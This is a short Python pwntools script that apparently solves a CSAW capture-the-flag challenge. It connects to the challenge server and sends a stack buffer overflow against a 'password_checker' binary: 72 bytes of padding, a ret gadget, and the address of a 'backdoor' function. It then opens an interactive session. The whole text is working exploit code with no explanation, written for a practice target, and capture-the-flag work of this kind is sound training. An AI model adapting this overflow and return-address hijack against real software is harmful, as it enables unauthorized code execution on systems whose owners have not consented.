#!/usr/bin/python3
from pwn import *

elf = ELF("./password_checker")
p = remote("pwn.chal.csaw.io",5000)
rop = ROP(elf)
ret = rop.find_gadget(["ret"]).address
p.sendline(b"A"*72 + p64(ret) + p64(elf.sym["backdoor"]))

p.interactive()
